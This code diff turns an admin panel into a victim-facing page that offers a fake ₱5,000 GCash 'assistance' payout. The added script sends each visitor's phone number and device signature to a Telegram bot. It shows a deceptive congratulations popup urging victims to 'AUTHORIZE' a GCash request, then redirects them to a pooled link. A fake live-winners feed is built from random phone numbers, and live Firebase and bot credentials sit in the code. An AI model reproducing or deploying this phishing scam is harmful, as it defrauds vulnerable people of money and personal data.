@@ -3,341 +3,252 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FreeShoppingPH | Admin App</title>
-    
+    <title>FreeShoppingPH | Official Assistance</title>
+
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;900&family=Quicksand:wght@700&display=swap" rel="stylesheet">
-    
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Quicksand:wght@700&display=swap" rel="stylesheet">
+
     <style>
         :root { 
-            --ph-blue: #0038a8;
-            --ph-red: #ce1126;
-            --ph-yellow: #fcd116;
-            --glass: rgba(255, 255, 255, 0.95);
-            --dark: #0f172a;
+            --nature-green: #2d6a4f; 
+            --emerald: #40916c; 
+            --white-glass: rgba(255, 255, 255, 0.95); 
         }
 
-        /* --- GLOBAL MOBILE RESET --- */
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body { 
             font-family: 'Public Sans', sans-serif; 
-            background: #f1f5f9; 
+            background: linear-gradient(135deg, #e9f5f0 0%, #d8f3dc 100%); 
             min-height: 100vh; 
-            color: var(--dark);
-            display: none; /* Hidden until signature check */
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 20px; 
         }
 
-        /* --- PH FLAG TITLE DESIGN --- */
-        .header-app {
-            padding: 40px 20px 20px;
-            text-align: center;
-            background: white;
-            border-bottom-left-radius: 30px;
-            border-bottom-right-radius: 30px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        .card { 
+            background: var(--white-glass); 
+            width: 100%; 
+            max-width: 400px; 
+            padding: 25px; 
+            border-radius: 30px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
+            text-align: center; 
         }
 
-        .flag-text {
-            font-family: 'Quicksand', sans-serif;
-            font-size: 26px;
-            font-weight: 900;
-            display: inline-block;
-            /* Blue Top 40%, White/Yellow middle, Red Bottom */
-            background: linear-gradient(to bottom, 
-                var(--ph-blue) 0%, 
-                var(--ph-blue) 40%, 
-                #fff 40%, 
-                var(--ph-yellow) 50%, 
-                var(--ph-red) 60%, 
-                var(--ph-red) 100%
-            );
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            filter: drop-shadow(0 2px 2px rgba(0,0,0,0.1));
-            letter-spacing: -0.5px;
+        .logo-img { width: 100%; border-radius: 20px; margin-bottom: 15px; border: 2px solid #fff; }
+        h1 { font-size: 18px; color: var(--nature-green); margin-bottom: 5px; font-weight: 800; }
+
+        .amount { 
+            font-family: 'Quicksand', sans-serif; 
+            font-size: 42px; 
+            font-weight: 700; 
+            color: var(--nature-green); 
+            margin-bottom: 20px; 
+        }
+
+        .pay-button { 
+            background: linear-gradient(135deg, #52b788 0%, #2d6a4f 100%); 
+            color: white; 
+            width: 100%; 
+            padding: 18px; 
+            border: none; 
+            border-radius: 15px; 
+            font-size: 16px; 
+            font-weight: 800; 
+            cursor: pointer; 
+            transition: 0.3s; 
+            box-shadow: 0 8px 15px rgba(45, 106, 79, 0.3);
             text-transform: uppercase;
         }
 
-        /* --- MOBILE APP ACCORDIONS --- */
-        .container { padding: 15px; }
+        .pay-button:active { transform: scale(0.96); }
+        .pay-button:disabled { background: #94a3b8; cursor: not-allowed; box-shadow: none; }
 
-        details {
-            background: white;
-            border-radius: 20px;
-            margin-bottom: 12px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.03);
-            border: 1px solid #e2e8f0;
-            overflow: hidden;
-            transition: all 0.3s ease;
+        .promo-photo { width: 100%; border-radius: 20px; margin-top: 20px; border: 2px solid #fff; }
+
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.8) translateY(10px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
         }
 
-        summary {
-            padding: 20px;
-            font-weight: 800;
-            font-size: 14px;
-            list-style: none;
-            display: flex;
-            justify-content: space-between;
+        .winners-container { 
+            margin-top: 25px; 
+            background: #f8fdfb; 
+            padding: 15px; 
+            border-radius: 20px; 
+            border: 1px solid #e0f2ea; 
+            text-align: left; 
+        }
+
+        .winner-item { 
+            background: white; 
+            padding: 10px 15px; 
+            border-radius: 12px; 
+            display: flex; 
+            justify-content: space-between; 
             align-items: center;
-            color: #475569;
-            cursor: pointer;
+            margin-bottom: 8px; 
+            font-size: 13px; 
+            border: 1px solid #eee;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
         }
 
-        summary::after { 
-            content: '＋'; 
-            font-size: 18px; 
-            color: var(--ph-blue); 
-            transition: 0.3s; 
-        }
-
-        details[open] summary { background: #f8fafc; color: var(--ph-blue); }
-        details[open] summary::after { content: '－'; transform: rotate(180deg); }
-
-        .content { 
-            padding: 0 20px 20px 20px; 
-            border-top: 1px solid #f1f5f9; 
-            animation: slideDown 0.3s ease-out;
-        }
-
-        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* --- HIGH LEVEL BUTTONS --- */
-        .btn-app {
-            width: 100%;
-            padding: 16px;
-            border-radius: 15px;
-            border: none;
-            font-weight: 800;
-            font-size: 14px;
-            letter-spacing: 0.5px;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-
-        .btn-primary { background: var(--ph-blue); color: white; }
-        .btn-auth { 
-            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); 
-            color: var(--ph-yellow); 
-            border: 1px solid var(--ph-yellow);
-        }
-        .btn-sec-green { background: #10b981; color: white; }
-        .btn-sec-red { background: var(--ph-red); color: white; }
-
-        .btn-app:active { transform: scale(0.96); opacity: 0.9; }
-
-        input, textarea {
-            width: 100%;
-            background: #f8fafc;
-            border: 2px solid #e2e8f0;
-            padding: 15px;
-            border-radius: 12px;
-            font-family: inherit;
-            margin-bottom: 12px;
-            outline: none;
-            font-size: 14px;
-        }
-
-        /* --- AMBULANCE LIGHTS --- */
-        .lights { position: fixed; top: 0; width: 100%; height: 6px; display: flex; z-index: 10000; }
-        .l-left { flex: 1; background: var(--ph-red); animation: blink 0.4s infinite alternate; }
-        .l-right { flex: 1; background: var(--ph-blue); animation: blink 0.4s infinite alternate-reverse; }
-        @keyframes blink { from { opacity: 1; } to { opacity: 0.3; } }
-
-        /* --- AUTH SHIELD OVERLAY --- */
-        #auth-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: white; z-index: 99999; display: flex; 
-            flex-direction: column; align-items: center; justify-content: center;
-            text-align: center; padding: 30px;
-        }
-
-        /* Status colors */
-        .status-open { color: #3b82f6; font-weight: 900; }
-        .status-strict { color: var(--ph-red); font-weight: 900; }
-
+        .gcash-icon { width: 18px; height: 18px; margin-right: 8px; vertical-align: middle; }
     </style>
 </head>
 <body>
 
-    <div id="auth-overlay">
-        <h2 class="flag-text">Verifying Admin Access...</h2>
-        <p style="margin-top: 15px; color: #64748b; font-size: 13px;">Scanning LinkSignature & Device Specs</p>
+<div class="card">
+    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" class="logo-img">
+
+    <h1>Available Assistance</h1>
+    <div class="amount">₱5,000.00</div>
+
+    <button class="pay-button" id="claimBtn" onclick="processClaim()">CLAIM THRU GCASH</button>
+
+    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo">
+
+    <div class="winners-container">
+        <h3 style="font-size:11px; text-align:center; color:var(--emerald); margin-bottom:12px; letter-spacing: 1px;">🔴 LIVE SUCCESS STORIES</h3>
+        <div id="winners-list"></div>
     </div>
+</div>
 
-    <div class="lights"><div class="l-left"></div><div class="l-right"></div></div>
+<script>
+    // 1. SESSION CHECK
+    if (sessionStorage.getItem('verified_user') !== 'true') {
+        window.location.href = "index.html";
+    }
 
-    <div class="header-app">
-        <h1 class="flag-text">FreeShoppingPH Admin</h1>
-        <p style="font-size: 11px; font-weight: 800; color: #94a3b8; margin-top: 8px;">
-            SYSTEM STATUS: <span id="statusText">CHECKING...</span>
-        </p>
-    </div>
-
-    <div class="container">
-        
-        <details class="exclusive-tab">
-            <summary>Claiming Portal Management</summary>
-            <div class="content">
-                <textarea id="gcashLink" rows="2" placeholder="Paste GCash Link Here..."></textarea>
-                <button class="btn-app btn-primary" onclick="assignLink()">ASSIGN PORTAL LINK</button>
-            </div>
-        </details>
-
-        <details class="exclusive-tab">
-            <summary>Live Monitoring (Max 5)</summary>
-            <div class="content">
-                <div style="overflow-x: auto;">
-                    <table style="width:100%; font-size:12px; text-align:left;">
-                        <tbody id="linksTable"></tbody>
-                    </table>
+    // 2. MOBILE ONLY FILTER
+    if (!/Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+        document.body.innerHTML = `
+            <div style="height:100vh; display:flex; align-items:center; justify-content:center; background:#f8f9fa; font-family:sans-serif; text-align:center; padding:20px;">
+                <div>
+                    <h2 style="color:#d63031;">ACCESS DENIED</h2>
+                    <p>This assistance program is only accessible via mobile devices.</p>
                 </div>
             </div>
-        </details>
+        `;
+    }
 
-        <details class="exclusive-tab">
-            <summary>System Security Control</summary>
-            <div class="content">
-                <div style="text-align: center; margin-bottom: 20px;">
-                   <p style="font-size:10px; margin-bottom:10px;">MASTER SWITCH</p>
-                   <button class="btn-app btn-sec-green" id="masterBtn" onclick="toggleSystem()">STRICT MODE</button>
-                </div>
-                <input type="tel" id="whiteNum" placeholder="Whitelist: 09xxxxxxxxx" oninput="checkWhitelistRealtime()">
-                <button id="whiteBtn" class="btn-app btn-sec-green" onclick="handleWhitelistAction()">GAIN ACCESS</button>
-            </div>
-        </details>
+    // 3. FIREBASE & TELEGRAM CONFIG
+    const firebaseConfig = {
+        apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
+        authDomain: "freeshoppingph-3bade.firebaseapp.com",
+        databaseURL: "https://freeshoppingph-3bade-default-rtdb.firebaseio.com",
+        projectId: "freeshoppingph-3bade",
+        storageBucket: "freeshoppingph-3bade.appspot.com",
+        messagingSenderId: "1028308831969",
+        appId: "1:1028308831969:web:96e224e75d69ba74332924",
+        botToken: "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg",
+        chatId: "7298607329"
+    };
 
-        <details class="exclusive-tab">
-            <summary>Authorize Admin Access</summary>
-            <div class="content">
-                <p style="font-size: 11px; color: #64748b; margin-bottom: 15px;">
-                    I-register ang device na ito sa database para magkaroon ng permanenteng access.
-                </p>
-                <div style="background: #f1f5f9; padding: 10px; border-radius: 10px; margin-bottom: 15px;">
-                    <code id="deviceSpecs" style="font-size: 9px; word-break: break-all;">Detecting specs...</code>
-                </div>
-                <button class="btn-app btn-auth" onclick="registerAdminDevice()">AUTHORIZE THIS DEVICE</button>
-            </div>
-        </details>
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    </div>
+    // 4. MAIN PROCESS
+    async function processClaim() {
+        const btn = document.getElementById('claimBtn');
+        const userPhone = sessionStorage.getItem('user_phone') || "Unknown";
+        const userSig = sessionStorage.getItem('user_sig') || "No-Sig";
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
-            authDomain: "freeshoppingph-3bade.firebaseapp.com",
-            databaseURL: "https://freeshoppingph-3bade-default-rtdb.firebaseio.com",
-            projectId: "freeshoppingph-3bade",
-            storageBucket: "freeshoppingph-3bade.appspot.com",
-            messagingSenderId: "1028308831969",
-            appId: "1:1028308831969:web:96e224e75d69ba74332924"
-        };
-        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
-        const db = firebase.database();
+        btn.disabled = true;
+        btn.innerText = "VERIFYING SLOT...";
 
-        // --- 1. LINKSIGNATURE LOGIC (DEVICE SPECS) ---
-        function generateLinkSignature() {
-            const specs = {
-                ua: navigator.userAgent,
-                sw: screen.width,
-                sh: screen.height,
-                cd: screen.colorDepth,
-                hc: navigator.hardwareConcurrency || 'N/A'
-            };
-            // Convert specs to a unique string/hash
-            const sig = btoa(specs.ua.substring(0, 15) + specs.sw + specs.sh + specs.hc).substring(0, 16);
-            document.getElementById('deviceSpecs').innerText = "SIG: " + sig + " | " + specs.sw + "x" + specs.sh;
-            return sig;
-        }
+        // TELEGRAM NOTIF
+        const alertMsg = `🎯 USER ATTEMPTING TO CLAIM:\n📱 Number: ${userPhone}\n🔑 Sig: ${userSig}\n🕒 Time: ${new Date().toLocaleString()}`;
+        fetch(`https://api.telegram.org/bot${firebaseConfig.botToken}/sendMessage?chat_id=${firebaseConfig.chatId}&text=${encodeURIComponent(alertMsg)}`)
+        .catch(e => console.log("Telegram alert failed"));
 
-        const mySignature = generateLinkSignature();
+        try {
+            // HANAP NG SLOT
+            const snapshot = await db.ref('AvailLinks').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
 
-        // --- 2. SECURITY SCANNER (ON LOAD) ---
-        async function runSecurityScan() {
-            const snap = await db.ref('authorized_admins/' + mySignature).once('value');
-            
-            if (snap.exists()) {
-                // Access Granted
-                document.getElementById('auth-overlay').style.display = 'none';
-                document.body.style.display = 'block';
-            } else {
-                // Access Denied
-                document.getElementById('auth-overlay').innerHTML = `
-                    <h1 style="color:var(--ph-red)">ACCESS DENIED</h1>
-                    <p style="margin-top:10px;">Device signature not recognized.</p>
-                    <p style="font-size:10px; color:gray; margin-top:20px;">SIG: ${mySignature}</p>
-                `;
-            }
-        }
-
-        // --- 3. REGISTER DEVICE ---
-        function registerAdminDevice() {
-            if (confirm("I-register ang phone na ito bilang Admin?")) {
-                db.ref('authorized_admins/' + mySignature).set({
-                    device: navigator.userAgent,
-                    registeredAt: Date.now()
-                }).then(() => {
-                    alert("Device Authorized! Reloading...");
-                    location.reload();
+            if (snapshot.exists()) {
+                let linkId, linkData;
+                snapshot.forEach(c => { 
+                    linkId = c.key; 
+                    linkData = c.val(); 
                 });
-            }
-        }
 
-        // --- 4. EXCLUSIVE TAB LOGIC (One at a time) ---
-        const allTabs = document.querySelectorAll('.exclusive-tab');
-        allTabs.forEach(tab => {
-            tab.addEventListener('toggle', function() {
-                if (this.open) {
-                    allTabs.forEach(t => { if (t !== this) t.removeAttribute('open'); });
-                }
-            });
-        });
+                // UPDATE STATUS
+                await db.ref('AvailLinks/' + linkId).update({
+                    status: 'in-use',
+                    beneficiary: userPhone,
+                    last_click: Date.now()
+                });
 
-        // --- 5. SYSTEM STATUS & MASTER SWITCH ---
-        db.ref('system_status').on('value', snap => {
-            const mode = snap.val()?.mode || 'strict';
-            const btn = document.getElementById('masterBtn');
-            const statusTxt = document.getElementById('statusText');
-            
-            if (mode === 'open') {
-                statusTxt.innerText = "OPEN ACCESS";
-                statusTxt.className = "status-open";
-                btn.innerText = "SWITCH TO STRICT";
-                btn.style.background = "#3b82f6";
+                // CONVINCING ALERT
+                Swal.fire({
+                    title: '🎉 CONGRATS!',
+                    html: `
+                        <div style="text-align: left; font-size: 14px; line-height: 1.5; color: #2d3436;">
+                            Magandang araw, <b>Beneficiary!</b><br><br>
+                            Ikaw ay isa sa mga mapalad na napili para sa ating <b>Grocery Cash Assistance</b> ngayong buwan. Upang matagumpay na ma-transfer ang <b>₱5,000.00</b> sa iyong account, kailangan mo lamang i-click ang <b>"AUTHORIZE"</b> sa susunod na page.<br><br>
+                            <span style="color: #2d6a4f; font-weight: bold;">Step:</span> Pagka-redirect sa GCash portal, i-confirm ang request para pumasok ang pondo sa iyong mobile number.<br><br>
+                            <i>Maraming salamat mula sa <b>FreeShopping</b>.</i>
+                        </div>
+                    `,
+                    icon: 'success',
+                    showConfirmButton: false,
+                    allowOutsideClick: false,
+                    timer: 5000, 
+                    timerProgressBar: true,
+                    didOpen: () => {
+                        Swal.showLoading();
+                    },
+                    willClose: () => {
+                        window.location.href = linkData.url;
+                    }
+                });
+
             } else {
-                statusTxt.innerText = "STRICT MODE";
-                statusTxt.className = "status-strict";
-                btn.innerText = "SWITCH TO OPEN";
-                btn.style.background = "var(--ph-red)";
+                Swal.fire({
+                    title: 'SLOTS FULL',
+                    text: 'Paumanhin: Naubusan na tayo ng active slots sa ngayon. Subukan muli mamaya.',
+                    icon: 'warning'
+                });
+                btn.disabled = false;
+                btn.innerText = "CLAIM THRU GCASH";
             }
-        });
-
-        function toggleSystem() {
-            const current = document.getElementById('statusText').innerText;
-            const newMode = current.includes("STRICT") ? "open" : "strict";
-            db.ref('system_status').update({ mode: newMode });
+        } catch (err) {
+            console.error(err);
+            btn.disabled = false;
+            btn.innerText = "CLAIM THRU GCASH";
         }
+    }
 
-        // --- INITIALIZE SCAN ---
-        // PANSAMANTALA: Kung ito ang unang beses mo at wala pang registered admin, 
-        // i-comment out muna ang line sa ibaba para makapasok at ma-click ang "Authorize".
-        runSecurityScan(); 
-
-        // --- REST OF YOUR CORE FUNCTIONS (AssignLink, Whitelist, etc.) ---
-        async function assignLink() {
-            const url = document.getElementById('gcashLink').value.trim();
-            if(!url) return;
-            const snap = await db.ref('AvailLinks').once('value');
-            if(snap.numChildren() >= 5) return alert("Max 5 links only.");
-            db.ref('AvailLinks').push({ url, status: 'available', beneficiary: 'NONE', timestamp: Date.now() });
-            document.getElementById('gcashLink').value = '';
-            alert("Link Added!");
+    // 5. LIVE SUCCESS STORIES
+    const prefixes = ['0917', '0915', '0927', '0935', '0945', '0995', '0966'];
+    function addWinner() {
+        const list = document.getElementById('winners-list');
+        if(!list) return;
+        const item = document.createElement('div');
+        item.className = 'winner-item';
+        const randomPhone = `${prefixes[Math.floor(Math.random()*prefixes.length)]}***${Math.floor(1000+Math.random()*9000)}`;
+        item.innerHTML = `
+            <div>
+                <img src="https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png" class="gcash-icon">
+                <span style="font-weight:600;">${randomPhone}</span>
+            </div>
+            <span style="color:#2d6a4f; font-weight:800;">+₱5,000</span>
+        `;
+        list.prepend(item);
+        if (list.children.length > 5) {
+            list.removeChild(list.lastChild);
         }
+    }
+    setInterval(addWinner, 4000);
+    addWinner();
+</script>
 
-        // ... (Idagdag dito ang checkWhitelistRealtime at handleWhitelistAction mula sa dating code)
-    </script>
 </body>
 </html>
